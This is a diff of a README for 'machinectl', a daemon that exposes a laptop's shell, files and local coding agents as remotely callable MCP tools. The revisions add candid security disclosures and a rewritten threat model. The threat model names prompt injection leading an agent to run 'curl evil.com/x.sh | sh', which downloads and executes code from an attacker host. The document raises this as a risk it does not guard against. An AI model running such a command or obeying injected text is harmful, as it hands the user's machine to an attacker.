@@ -1,8 +1,8 @@
 # machinectl
 
-Your laptop, as an MCP server. Reachable from Access-authenticated MCP clients, gated by Cloudflare Access, and audited at the Worker boundary.
+Your laptop, as a remotely callable MCP tool runtime. The daemon opens an outbound WebSocket to a compatible operator-controlled Worker endpoint; that Worker is responsible for authentication, routing, and audit handling.
 
-> **Deployment note:** the default endpoint in this repository is the author's `my.ax.cloudflare.dev` Worker deployment. The daemon is useful to other operators when paired with a compatible Worker-side `MachineHost` endpoint and their own Cloudflare Access policy. No Cloudflare affiliation or support is implied.
+> **Deployment note:** this repository contains the laptop-side daemon only. You must provide a compatible Worker-side `MachineHost` endpoint protected by an authentication policy you control. Do not connect this daemon to an endpoint you do not trust.
 
 ## What changed from the prototype
 
@@ -12,21 +12,21 @@ The original machinectl bound a local port and pushed a Cloudflare quick tunnel 
 - The local daemon was the audit boundary. Lose the daemon, lose the trail.
 - Anyone who learned the URL had a remote shell on your laptop.
 
-**This version inverts that.** No inbound port, no public tunnel. The laptop daemon opens an outbound WebSocket to a Cloudflare Worker. The Worker is the MCP endpoint, sits behind Cloudflare Access, and writes an audit receipt for every tool call to KV. The laptop is just the runtime — auth, transport, and audit all live in front of it.
+**This version inverts that.** No inbound port, no quick tunnel. The laptop daemon opens an outbound WebSocket to an operator-controlled Worker. The Worker is the MCP endpoint and owns authentication, routing, and any audit policy. The laptop is only the execution runtime.
 
 ```
                        ┌──────────────────────────────┐
                        │ MCP client                   │
-                       │ (Claude.ai / my-ax / etc)    │
+                       │ (MCP-capable client)         │
                        └──────────────┬───────────────┘
                                       │ POST /machinectl/mcp
-                                      │ (Cloudflare Access JWT)
+                                      │ (operator-configured authentication)
                                       ▼
                        ┌──────────────────────────────┐
-                       │ my.ax.cloudflare.dev Worker  │
-                       │  • Access app gate           │
+                       │ compatible Worker endpoint   │
+                       │  • authentication gate       │
                        │  • per-user MachineHost DO   │
-                       │  • AUDIT_KV receipts         │
+                       │  • audit policy/receipts     │
                        └──────────────┬───────────────┘
                                       │ WebSocket (outbound from laptop)
                                       │ keyed by Access email
@@ -55,60 +55,70 @@ You need `cloudflared` installed locally so the daemon can fetch your Access JWT
 brew install cloudflared
 ```
 
-## First-time auth
+## Configure endpoint and authenticate
+
+Set the trusted compatible Worker endpoint explicitly:
 
 ```bash
-cloudflared access login https://my.ax.cloudflare.dev
+export MACHINECTL_URL=https://machinectl.example.com
 ```
 
-Opens a browser, you SSO with Cloudflare, the JWT lands in `~/.cloudflared/`. The daemon reads it from there. Re-run if the JWT expires (typically every ~24h depending on the Access policy).
+If your endpoint is protected by Cloudflare Access, authenticate to that URL once:
+
+```bash
+cloudflared access login https://machinectl.example.com
+```
+
+The daemon obtains the cached Access JWT for the configured `MACHINECTL_URL` via `cloudflared access token`. Re-run login when your endpoint's Access session expires. For local testing or alternative launch environments, `MACHINECTL_ACCESS_TOKEN` may provide the token explicitly.
 
 ## Run
 
-`MACHINECTL_ALLOWED_PATHS` is a comma-separated list of **absolute directory prefixes** the filesystem tools (`read_file`, `write_file`, `list_directory`) and local coding-agent sessions are allowed to touch. It has zero relationship to where the daemon binary itself lives.
+`MACHINECTL_ALLOWED_PATHS` is a comma-separated list of **absolute directory prefixes** used by `read_file`, `write_file`, `list_directory`, local-file targets passed to `open`, optional `cwd` checks for shell-capable tools, and local coding-agent sessions. It does **not** sandbox the contents of `exec_command` or the current shell-interpreted `git` tool. It has zero relationship to where the daemon binary itself lives.
 
 ```bash
-# Allow filesystem tools to operate inside your work + personal project trees.
-MACHINECTL_ALLOWED_PATHS=/Users/you/cloudflare,/Users/you/projects \
+# Allow filesystem tools to operate inside your project trees.
+MACHINECTL_URL=https://machinectl.example.com \
+MACHINECTL_ALLOWED_PATHS=/Users/you/projects,/Users/you/work \
   ~/cloudflare/machinectl/dist/index.js
 ```
 
 Want to open it to your whole home dir? Sure — but think about what's in there (`.ssh/`, `.aws/`, browser sessions, etc.) before you do:
 
 ```bash
-MACHINECTL_ALLOWED_PATHS=$HOME ~/cloudflare/machinectl/dist/index.js
+MACHINECTL_URL=https://machinectl.example.com MACHINECTL_ALLOWED_PATHS=$HOME \
+  ~/cloudflare/machinectl/dist/index.js
 ```
 
-Want the daemon to run, but filesystem tools to refuse? Just leave the var unset:
+Want the daemon to run, but catalogued filesystem and coding-agent tools to be unavailable? Just leave the var unset:
 
 ```bash
-~/cloudflare/machinectl/dist/index.js
+MACHINECTL_URL=https://machinectl.example.com ~/cloudflare/machinectl/dist/index.js
 # → [!] filesystem and agent-session tools are DISABLED
 # → [!] set MACHINECTL_ALLOWED_PATHS=/abs/path1,/abs/path2 and restart to enable
 ```
 
-`exec_command` and `git` always register. Their *optional* `cwd` argument is path-gated if you supply one; without `cwd`, they run in the daemon's PWD. Local-agent controls (`agent_*`) register only when allowed paths are configured, because every new pi/OpenCode process must start in an explicitly scoped repository. The other tools (`screenshot`, `processes`, `clipboard`, `notify`, `open` with a URL) aren't filesystem-bound and are unaffected.
+`exec_command` and `git` always register. Their *optional* `cwd` argument is path-gated if supplied; without `cwd`, they run in the daemon's PWD. Their shell command content can still read or modify any resource available to the local user. Local-agent controls (`agent_*`) register only when allowed paths are configured because every new pi/OpenCode process must start in an explicitly scoped repository. `screenshot`, `processes`, `clipboard`, and `notify` are unaffected; `open` remains published for URLs but applies path checks to local-file targets.
 
 Output on a successful connect:
 
 ```
 [machinectl] machinectl daemon — machine: "your-macbook"
-[machinectl] worker: https://my.ax.cloudflare.dev
+[machinectl] worker: https://machinectl.example.com
 [machinectl] tools registered: exec_command, git, agent_start, agent_list, agent_status, agent_logs, agent_prompt, agent_steer, agent_follow_up, agent_pi_command, agent_abort, agent_stop, read_file, write_file, list_directory, screenshot, processes, clipboard, notify, open
-[machinectl] connecting to wss://my.ax.cloudflare.dev/machinectl/connect as "your-macbook"
+[machinectl] connecting to wss://machinectl.example.com/machinectl/connect as "your-macbook"
 [machinectl] connected; publishing tool catalog
 ```
 
-Any MCP client that hits `https://my.ax.cloudflare.dev/machinectl/mcp` through the applicable Cloudflare Access policy sees the currently connected tool catalog and can call it. The call lands at the Worker, gets audited, gets pushed down your WebSocket, runs on your laptop, and returns through the same path.
+An MCP client capable of authenticating through your endpoint's configured policy can call `https://machinectl.example.com/machinectl/mcp`. The call lands at the Worker, is handled according to its audit policy, is forwarded over your WebSocket, executes on your laptop, and returns along the same path. With allowed paths configured, the current daemon catalog contains 20 tools; without them, filesystem and `agent_*` tools are not published.
 
 ## Config
 
 | Env var | Default | What it does |
 |---|---|---|
-| `MACHINECTL_URL` | `https://my.ax.cloudflare.dev` | Worker base. Override for dev or for a separate deployment. |
+| `MACHINECTL_URL` | (operator endpoint required) | Base URL of your trusted compatible Worker endpoint, e.g. `https://machinectl.example.com`. Set this explicitly before running the daemon. |
 | `MACHINECTL_NAME` | `os.hostname()` | Human-readable machine name surfaced in the catalog + audit logs. |
 | `MACHINECTL_ALLOWED_PATHS` | (empty) | Comma-separated absolute directory prefixes the filesystem tools (`read_file`, `write_file`, `list_directory`) and local coding-agent sessions may touch. **Filesystem and `agent_*` tools refuse to register if empty.** Multiple paths: `MACHINECTL_ALLOWED_PATHS=/Users/me/work,/Users/me/projects,/tmp/scratch`. Unrelated to where the daemon binary lives. |
-| `MACHINECTL_EXEC_TIMEOUT` | `60000` | Per-call timeout in ms for `exec_command` and `git`. Max 5 minutes hard cap. |
+| `MACHINECTL_EXEC_TIMEOUT` | `60000` | Per-call timeout in ms for `exec_command` and `git`; minimum 1000 ms. No maximum is currently enforced. |
 | `MACHINECTL_ACCESS_TOKEN` | (unset) | Override for the Access JWT instead of pulling from cloudflared. Useful in CI / containers. |
 | `MACHINECTL_AGENT_MAX_SESSIONS` | `4` | Maximum concurrently active local pi/OpenCode sessions. Min 1, max 32. |
 | `MACHINECTL_AGENT_MAX_RUNTIME_MS` | `7200000` | Hard lifetime limit per local coding-agent session (default 2 hours; min 1 minute, max 24 hours). |
@@ -119,7 +129,7 @@ Any MCP client that hits `https://my.ax.cloudflare.dev/machinectl/mcp` through t
 | Tool | Description | Path-gated |
 |---|---|---|
 | `exec_command` | Run a shell command. Captures stdout/stderr/exit. 256KB output cap. Timeout from `MACHINECTL_EXEC_TIMEOUT`. | Optional cwd is gated. |
-| `git` | Allow-listed git subcommands (status, diff, log, show, add, commit, push, pull, fetch, branch, stash, rebase, merge, cherry-pick, reset, revert, tag, blame, remote, config, rev-parse, describe, switch, checkout). | Optional cwd is gated. |
+| `git` | Run a shell command prefixed with `git` after checking that its first token is one of the listed git subcommands. **Because arguments are presently shell-interpreted, this tool is shell-equivalent and not a security boundary.** | Optional cwd is gated; command content is not confined. |
 | `read_file` | Read a file (utf-8). Up to 256KB; larger files truncated with a notice. | Yes |
 | `write_file` | Write content to a file. Creates parent dirs. Overwrites. | Yes |
 | `list_directory` | List a directory. Set `recursive=true` and `maxDepth` (1–8, default 3) to walk children. | Yes |
@@ -127,7 +137,7 @@ Any MCP client that hits `https://my.ax.cloudflare.dev/machinectl/mcp` through t
 | `processes` | Top N processes by cpu or memory. | No |
 | `clipboard` | Read/write the system clipboard. macOS: `pbpaste`/`pbcopy`. Linux: `wl-copy` / `xclip`. | No |
 | `notify` | Send a system notification. macOS: `osascript`. Linux: `notify-send`. | No |
-| `open` | Open a URL or file in the system default handler. URLs are unrestricted; file paths are gated. | Path arg gated. |
+| `open` | Open a URL or file in the system default handler. URLs are unrestricted. This tool remains published without allowed paths; local-file targets are rejected at call time unless permitted. | File target gated at call time. |
 | `agent_start` | Start a local `pi` session over RPC, or a captured bounded `opencode run` job. | Requires a `cwd` inside configured allowed paths. |
 | `agent_list` / `agent_status` / `agent_logs` | Inspect active sessions, structured pi events, captured output, and optionally recent saved pi sessions for resume. | No additional path access. |
 | `agent_prompt` / `agent_steer` / `agent_follow_up` | Prompt or steer a live pi RPC session. | Existing session only. |
@@ -153,7 +163,7 @@ Any MCP client that hits `https://my.ax.cloudflare.dev/machinectl/mcp` through t
 Example sequence from an MCP caller:
 
 ```text
-agent_start({agent:"pi", cwd:"/Users/me/cloudflare/my-ax", prompt:"inspect the failing tests and fix them"})
+agent_start({agent:"pi", cwd:"/Users/me/projects/my-app", prompt:"inspect the failing tests and fix them"})
 agent_status({id:"<returned id>"})
 agent_steer({id:"<returned id>", message:"do not modify migrations; keep the fix in UI code"})
 agent_pi_command({id:"<returned id>", command:"get_last_assistant_text"})
@@ -163,38 +173,38 @@ agent_pi_command({id:"<returned id>", command:"get_last_assistant_text"})
 
 `agent_start({ agent: "opencode", cwd: "/absolute/repo", prompt: "..." })` starts `opencode run --format json` and captures its output. Poll it with `agent_status` / `agent_logs` or stop it with `agent_stop`. Live prompt/steer controls are deliberately pi-only until OpenCode's programmatic session transport is integrated.
 
-Agent processes inherit the daemon's user environment and local CLI credentials. `agent_start` refuses to run unless `MACHINECTL_ALLOWED_PATHS` is configured and its `cwd` falls within one of those roots. Saved pi-session discovery only exposes sessions whose original `cwd` remains inside those roots; explicit session paths, `switch_session`, and `export_html` output paths are likewise gated. Agent processes are capped by count and runtime, are stopped as process groups, and are terminated when the daemon shuts down. Restrict who can access the MCP endpoint accordingly.
+Agent processes inherit the daemon's user environment and local CLI credentials. `agent_start` refuses to run unless `MACHINECTL_ALLOWED_PATHS` is configured and its `cwd` falls within one of those roots. Saved pi-session discovery only exposes sessions whose recorded `cwd` remains inside those roots; explicit session paths, `switch_session`, and explicit `export_html` output paths are likewise gated. Running-session control state is held in daemon memory: if the daemon restarts, active session handles are lost, although pi-persisted session files may later be reopened. Agent processes are capped by count and runtime, are stopped as process groups on supported platforms, and tracked sessions are terminated when the daemon shuts down. Restrict who can access the MCP endpoint accordingly.
 
 ## Audit
 
-Every tool call writes a receipt to `AUDIT_KV` on the Worker side, keyed `machinectl:<email>:<ts>:<rand>`, 90-day TTL. Receipts include: timestamp, tool name, args, ok/error, content preview (capped at 2 KB so screenshots don't blow up the KV entry). No local audit file — the source of truth is the Worker.
+Audit behavior is implemented by the Worker endpoint, not by this daemon. In the compatible Worker implementation currently used by the author, a post-execution receipt is attempted in `AUDIT_KV`, keyed `machinectl:<email>:<ts>:<rand>` with a 90-day TTL. The current receipt shape includes timestamp, tool name, **raw arguments**, ok/error, and a result-content preview capped at 2 KB. This may retain sensitive material such as commands, prompt text, paths, clipboard input, or file/output excerpts. Do not use secret-bearing inputs or request sensitive output unless you trust and have reviewed your Worker's receipt policy.
 
-Inspect receipts via the Worker's existing audit UI or via `wrangler kv key list --namespace-id <AUDIT_KV>`. (List/inspect tooling for `machinectl:` prefix is a TODO in the my-ax UI.)
+Receipts are written after execution; a Worker-side receipt write failure can occur after a laptop action has already completed. Operators should implement the audit retention, redaction, alerting, and failure policy appropriate to their deployment.
 
 ## What's intentionally limited
 
-- **No `MACHINECTL_TOKEN` / bearer-token-as-URL.** Access JWT is the auth. There is no fallback. Lose `cloudflared`, you can't connect.
+- **No `MACHINECTL_TOKEN` / bearer-token-as-URL.** With a Cloudflare Access-protected endpoint, an Access JWT is the authentication mechanism used by this daemon. Operators using another compatible endpoint own its authentication design.
 - **No quick tunnel.** No public URL to leak.
-- **No local dashboard.** The Worker's audit is the dashboard. No half-orphan UI on `localhost:7331` to forget about.
-- **`exec_command` is full shell, by design.** It's audited end-to-end and gated by Access in front. If you want a more restricted variant, narrow `git`'s subcommand allow-list as a model and copy the pattern.
+- **No local dashboard.** Any audit inspection or dashboard experience belongs to your Worker-side deployment, not this laptop daemon.
+- **`exec_command` is full shell, by design.** The current `git` implementation is also shell-equivalent despite checking its first subcommand token; do not rely on it as a restricted execution boundary until it is changed to invoke Git without a shell.
 - **Filesystem and `agent_*` tools refuse to register without `MACHINECTL_ALLOWED_PATHS`.** No `$HOME` default. Forces deliberate scoping.
 - **One laptop per user at a time.** Latest WS connection wins; previous gets a clean close. If you connect from your work laptop while your home laptop is already up, the home laptop disconnects.
 
 ## Threat model (honest)
 
-The blast radius of `exec_command` is the same as any LLM-driven terminal you're already using on this machine (Claude Code, OpenCode, Codex, etc.). If you trust an LLM with shell access in *that* context, `machinectl` with `exec_command` is **strictly better**:
+The blast radius of `exec_command` is the same as any LLM-driven terminal you already permit on this machine (Claude Code, OpenCode, Codex, etc.). Machinectl changes the transport and attribution model: the laptop makes an outbound connection to an authenticated Worker endpoint rather than exposing a local quick tunnel. That can improve access control and accountability, but it also introduces Worker-side routing and audit-retention risks that operators must evaluate.
 
-- Caller identity is the verified Cloudflare Access identity, not "the assistant" with no attribution attached.
-- Every tool call writes a structured audit receipt to `AUDIT_KV` with 90-day TTL. Easy to grep, easy to alert on.
-- Path-touching tools (`read_file`, `write_file`, `list_directory`, `open` with a file path, `exec_command` with a `cwd`) are scoped to `MACHINECTL_ALLOWED_PATHS` with realpath enforcement against symlink escapes.
-- No inbound port. No public URL. The only thing reachable from the internet is the Worker, behind Access.
+- Caller attribution is determined by the configured Worker authentication policy.
+- The reference Worker design can emit centralized audit receipts, whose redaction and failure semantics must be treated as part of the security boundary.
+- Dedicated path tools (`read_file`, `write_file`, `list_directory`) and local-file `open` targets are scoped to `MACHINECTL_ALLOWED_PATHS` with realpath enforcement against symlink escapes; optional `cwd` checks do not sandbox shell command contents.
+- No inbound laptop port or quick tunnel is required; only the configured Worker endpoint is remotely reachable.
 
 What it does **not** defend against:
-- A compromised laptop. If `~/.cloudflared/*.json` is stolen, the attacker can impersonate you until the JWT expires. Same as every other Access-protected service you use.
-- Prompt injection convincing the agent to run `curl evil.com/x.sh | sh`. The audit log shows you (under your identity) did it; it doesn't prevent it. This is the existing trust model of every LLM-with-shell tool. machinectl makes it auditable, not impossible.
+- A compromised laptop. For Cloudflare Access-based deployments, theft of locally cached Access credentials may allow impersonation until those credentials expire or are revoked.
+- Prompt injection convincing the agent to run `curl evil.com/x.sh | sh`. A Worker may attribute and receipt the action according to its policy; it does not prevent execution. This is the existing trust model of every LLM-with-shell tool.
 - An LLM you don't trust. The threat model assumes the LLM-on-the-other-end is operating in your interest. If it isn't, no audit log saves you.
 
-If you wouldn't run a long-lived terminal session with an LLM that has shell access on this machine, don't run `machinectl` either. If you would (and increasingly most of us do), `machinectl` is the same surface area with better attribution and better audit.
+If you would not run a long-lived terminal session with an LLM that has shell access on this machine, do not run `machinectl`. If you would, evaluate the configured Worker's authentication, routing, and receipt-retention behavior as additional parts of that trust decision.
 
 ## Multi-machine
 
@@ -209,11 +219,11 @@ npm test
 npm run dev
 ```
 
-The Worker-side relay is not bundled into this npm package. To run your own endpoint, implement the outbound WebSocket and MCP routing contract documented by `src/protocol.ts`, place it behind an Access policy, and set `MACHINECTL_URL` to that deployment.
+The Worker-side relay is not bundled into this npm package. To run an endpoint, implement the outbound WebSocket and MCP routing contract documented by `src/protocol.ts`, protect it with an authentication policy you control, and set `MACHINECTL_URL` to that deployment. Worker implementations may expose additional authenticated native invocation surfaces beyond the public daemon protocol; those surfaces are not provided by this repository.
 
 ## Security reporting
 
-This project deliberately provides remote shell-equivalent capability when `exec_command` is enabled (it is enabled by default). Do not run it against an Access endpoint you do not control or trust. If you find a vulnerability in authentication, routing, path enforcement, or audit behavior, please open a GitHub security advisory rather than a public exploit issue.
+This project deliberately provides remote shell-equivalent capability through `exec_command` (enabled by default) and, in the current release, through the shell-interpreted `git` tool as well. Do not run it against an endpoint you do not control or trust. If you find a vulnerability in authentication, routing, path enforcement, execution lifecycle, or audit behavior, please open a GitHub security advisory rather than a public exploit issue.
 
 ## License
 
